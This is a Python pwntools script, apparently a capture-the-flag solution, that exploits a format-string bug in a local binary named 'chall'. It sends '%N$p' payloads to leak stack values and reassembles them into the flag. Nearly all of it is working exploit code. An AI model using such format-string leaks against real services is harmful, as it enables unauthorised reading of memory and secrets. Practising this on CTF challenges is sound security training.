from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def solve():
    io = process('./chall')         

    leaked_hexs = []

    OFFSET_INICIAL = 10
    OFFSET_FINAL = 15

    for i in range(OFFSET_INICIAL, OFFSET_FINAL):
        payload = f"%{i}$p"
        io.sendlineafter(b"Enter your name: ", payload.encode())

        output = io.recvline().decode()
        
        words = output.split()
        for w in words:
            if w.startswith("0x"):
                clean_hex = w.rstrip("!").rstrip(".")
                leaked_hexs.append(clean_hex)
                break

    log.info(f"Valores hexadecimais vazados: {leaked_hexs}")

    flag_bytes = b""
    for hex_val in leaked_hexs:
        val = int(hex_val, 16)
        flag_bytes += p64(val)

    flag = flag_bytes.decode('latin-1', errors='ignore').split('}')[0] + '}'
    log.success(f"Flag obtida: {flag}")

    io.close()

if __name__ == "__main__":
    solve()